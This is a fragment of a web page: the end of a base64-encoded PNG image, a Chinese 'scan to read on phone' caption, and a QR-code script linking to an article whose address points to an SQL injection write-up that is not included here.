Zg59REPCxnN6/r1T+Dwm7pHWG0z3xK5aH9izjMvZj65/ZmXz9AZ6aW+nr3/939z2e/81JObc84Mr0+IT+1DcPtNPbe1Op+5lZ9vgXyVz3nJ7cs55mZoT3rqKzS/8ldnMG9/YvryGV6fkNlTeaO2fQ9x+4+iZ169Dfqic82ri6mbX/nq5grVxNLG8h6JY6au9Z0jqovqiTWj6kyvTNb1Ccmn9ma+LcStn+HqvG7afnNyMXPyRPOi8xL1C9NL7j1Sl9eMKnN1PZZ6ov2iPXIxdfmI20JsuvC9T+CwkNy+fHVMfbecOX0x/exLbj775TO0R3SmqG6vujz91PUTzSWe5Ub/sJDRvK5f/wRethDfwvwSfZvSVzevn6hfmJ48Z1X2Xtm3yuif4ao/+zxf4csWsjrcpe+fwB9bSG27ytvVdZVvR11X6See5aq3ylxhzii/Sr2uq+RiaVUrXrPHquxY2aenbm/qySv/xxZSw696/gkcFuI2E1ejzeW21e1b8dRzjv1nevmZdXaiOXV5Yvp1jypz6Sc3t8JZ/rCQVfOlv+YJbAupzT9SZ8dyRuZWeuZ8a8zLMyfXL7RH7wzNV++s9MWct9KdlXm5faJ64baQIle9/wlcC3n/DnYn+B8AAAD//4oQ2KgAAAAGSURBVAMANUXjsLn0P3UAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/baiyishequ-adminx-make-project\_id-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 